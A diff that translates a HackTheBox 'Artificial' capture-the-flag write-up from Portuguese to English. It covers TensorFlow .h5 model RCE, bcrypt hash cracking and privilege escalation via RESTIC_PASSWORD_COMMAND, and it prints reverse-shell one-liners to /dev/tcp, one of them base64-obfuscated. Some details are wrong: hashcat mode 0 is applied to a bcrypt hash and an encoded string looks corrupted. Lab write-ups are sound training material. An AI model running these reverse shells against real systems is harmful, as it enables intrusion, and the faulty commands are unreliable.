@@ -1,55 +1,46 @@
 # HackTheBox - Artificial (Write-up)
 
-Este é um write-up detalhado da máquina **Artificial** no HackTheBox.  
-O objetivo foi explorar vulnerabilidades em modelos TensorFlow maliciosos para obter execução remota de código, escalar privilégios e capturar as flags de `user.txt` e `root.txt`.
+This is a detailed write-up of the **Artificial** machine on
+HackTheBox.\
+The objective was to exploit vulnerabilities in malicious TensorFlow
+models to achieve remote code execution (RCE), escalate privileges, and
+capture the `user.txt` and `root.txt` flags.
 
----
+------------------------------------------------------------------------
 
-## 📌 Sumário
-- [Reconhecimento](#-reconhecimento)
-- [Acesso Inicial](#-acesso-inicial)
-- [Exploração do TensorFlow](#-exploração-do-tensorflow)
-- [Acesso ao Contêiner](#-acesso-ao-contêiner)
-- [Escalada de Privilégios](#-escalada-de-privilégios)
-- [Flags](#-flags)
-- [Conclusão](#-conclusão)
+## Reconnaissance
 
----
+Running **nmap** to identify open ports:
 
-## 🔎 Reconhecimento
-
-Utilizando o **nmap** para identificar portas abertas:
-
-```bash
+``` bash
 nmap -sCVT 10.10.11.74
 ```
 
-Resultado:
+Result:
 
-```
-PORT   STATE SERVICE VERSION
-22/tcp open ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
-80/tcp open http    nginx 1.18.0 (Ubuntu)
-```
+    PORT   STATE SERVICE VERSION
+    22/tcp open ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+    80/tcp open http    nginx 1.18.0 (Ubuntu)
 
-- Serviço HTTP redirecionava para `http://artificial.htb/`.
+-   HTTP service redirected to `http://artificial.htb/`.
 
----
+------------------------------------------------------------------------
 
-## 🔑 Acesso Inicial
+## Initial Access
 
-Foi possível criar uma conta demo para explorar a aplicação.  
-O sistema permitia upload de arquivos `.h5` (modelos TensorFlow).
+It was possible to create a demo account to explore the application.\
+The system allowed uploading `.h5` files (TensorFlow models).
 
-Descoberta: vulnerabilidade de execução remota de código (RCE) no carregamento de modelos TensorFlow.
+Discovery: remote code execution (RCE) vulnerability in TensorFlow model
+loading.
 
----
+------------------------------------------------------------------------
 
-## 💥 Exploração do TensorFlow
+## TensorFlow Exploitation
 
-Exploit em Python para criar um `.h5` malicioso:
+Python exploit to create a malicious `.h5` file:
 
-```python
+``` python
 import tensorflow as tf
 import os
 
@@ -64,91 +55,93 @@ model.compile()
 model.save("exploit.h5")
 ```
 
-Criação do contêiner para compilar o modelo malicioso:
+Building the container to generate the malicious model:
 
-```bash
+``` bash
 docker run -it --rm -v "$PWD":/app -w /app tensorflow/tensorflow:2.13.0 python3 exploit.py
 ```
 
-Upload do `exploit.h5` no Web UI → **View Predictions** → Reverse shell obtida.
+Upload `exploit.h5` in the Web UI → **View Predictions** → reverse shell
+obtained.
 
----
+------------------------------------------------------------------------
 
-## 🖥️ Acesso ao Contêiner
+## Container Access
 
-Após o upload, abrir shell interativa:
+After the upload, spawn an interactive shell:
 
-```bash
+``` bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Agora, acesso inicial garantido no contêiner.
+Now we have initial access inside the container.
 
----
+------------------------------------------------------------------------
 
-## 🚀 Escalada de Privilégios
+## Privilege Escalation
 
-Foi encontrado arquivo `config.json` dentro de `.config/backrest/`:
+A `config.json` file was found inside `.config/backrest/`:
 
-```bash
+``` bash
 cat .config/backrest/config.json
 ```
 
-Credenciais (bcrypt):
+Credentials (bcrypt):
 
-```
-"user": "backrest_root",
-"passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
-```
+    "user": "backrest_root",
+    "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
 
-Bruteforce da senha via hashcat:
+Password bruteforce with hashcat:
 
-```bash
+``` bash
 hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-Exploração com variável de ambiente `RESTIC_PASSWORD_COMMAND` para reverse shell persistente:
+Exploiting the environment variable `RESTIC_PASSWORD_COMMAND` for a
+persistent reverse shell:
 
-```bash
+``` bash
 echo "bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1" | base64
 ```
 
-Uso no ENV:
+Usage in ENV:
 
-```bash
+``` bash
 RESTIC_PASSWORD_COMMAND=echo "YmFzaCAtaSA+JiAvZGVzxL3RjcC8xMC4xMC4xNi4xMzUvNDQ0NCAwPiYxCg==" | base64 -d | bash
 ```
 
-Para persistência de longo prazo:
+For long-term persistence:
 
-```bash
+``` bash
 RESTIC_PASSWORD_COMMAND=bash -c 'bash -i >& /dev/tcp/10.10.xx.xxx/4444 0>&1'
 ```
 
----
+------------------------------------------------------------------------
 
-## 🏁 Flags
+## Flags
 
-Após acesso root:
+After root access:
 
-```bash
+``` bash
 cat /home/user/user.txt
 cat /root/root.txt
 ```
 
----
+------------------------------------------------------------------------
 
-## ✅ Conclusão
+## Conclusion
 
-A máquina **Artificial** explorou falhas críticas em Machine Learning:
+The **Artificial** machine demonstrated critical flaws in Machine
+Learning pipelines:
 
-1. **Nmap** revelou SSH e HTTP.  
-2. **TensorFlow RCE** via upload de modelo `.h5`.  
-3. **Reverse shell** através de código malicioso embutido no modelo.  
-4. **Config.json** com credenciais expostas.  
-5. **PrivEsc** via variável `RESTIC_PASSWORD_COMMAND`.  
-6. Flags capturadas com sucesso.  
+1.  **Nmap** revealed SSH and HTTP.\
+2.  **TensorFlow RCE** via malicious `.h5` upload.\
+3.  **Reverse shell** through injected code in the model.\
+4.  **Config.json** exposed sensitive credentials.\
+5.  **Privilege escalation** via `RESTIC_PASSWORD_COMMAND`.\
+6.  Successfully captured both flags.
 
+```{=html}
+<!-- -->
 ```
-Status: PWNED 🏴‍☠️
-```
+    Status: PWNED 🏴‍☠️
